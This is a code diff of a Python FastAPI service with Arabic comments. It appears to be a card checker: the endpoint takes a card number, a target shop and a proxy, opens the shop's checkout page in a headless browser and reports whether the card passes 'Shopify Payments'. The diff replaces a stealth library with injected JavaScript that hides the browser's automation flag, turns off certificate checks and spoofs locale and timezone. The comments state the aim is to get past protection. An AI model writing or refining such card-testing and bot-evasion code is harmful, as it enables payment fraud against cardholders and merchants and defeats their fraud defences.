@@ -1,7 +1,5 @@
 from fastapi import FastAPI, Query
 from playwright.async_api import async_playwright
-# الاستيراد المحدث للإصدارات الجديدة
-from playwright_stealth import Stealth 
 import uvicorn
 
 app = FastAPI()
@@ -9,33 +7,41 @@ app = FastAPI()
 @app.get("/check")
 async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = Query(None)):
     async with async_playwright() as p:
+        # إعدادات متقدمة لتجاوز الحماية مدمجة بدون مكاتب خارجية
         browser = await p.chromium.launch(args=[
             "--no-sandbox", 
             "--disable-dev-shm-usage",
-            "--disable-blink-features=AutomationControlled"
+            "--disable-blink-features=AutomationControlled", 
+            "--disable-infobars",
+            "--window-position=0,0",
+            "--ignore-certificate-errors",
         ])
         
         context_args = {
             "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-            "viewport": {"width": 1280, "height": 720}
+            "viewport": {"width": 1280, "height": 720},
+            "locale": "en-US",
+            "timezone_id": "America/New_York",
         }
+        
         if proxy:
             context_args["proxy"] = {"server": proxy}
             
         context = await browser.new_context(**context_args)
         
-        # تطبيق التخفي المحدث على السياق (Context) بالكامل
-        stealth = Stealth()
-        await stealth.apply_stealth_async(context)
+        # حقن كود لإخفاء خاصية الأتمتة التلقائية بنجاح
+        await context.add_init_script("""
+            Object.defineProperty(navigator, 'webdriver', {
+                get: () => undefined
+            });
+        """)
         
-        # فتح الصفحة بعد تطبيق التخفي
         page = await context.new_page()
         
         try:
             await page.goto(f"{site}/checkout", timeout=90000, wait_until="load")
             await page.wait_for_selector('input', timeout=30000)
             
-            # (بقية الكود الخاص بك)...
             email_field = page.locator('input[type="email"], input[name*="email"], input[placeholder*="Email"]').first
             await email_field.fill("user@example.com")
             
@@ -82,7 +88,7 @@ async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = 
             return {"Gateway": "Shopify Payments", "Response": "FAILED", "Details": str(e), "Status": "false", "CC": cc}
             
         finally:
-            # إغلاق المتصفح الآمن لمنع تسريب الذاكرة على Railway
+            # إغلاق المتصفح لضمان عدم امتلاء الذاكرة وكراش الحاوية
             await browser.close()
 
 if __name__ == "__main__":
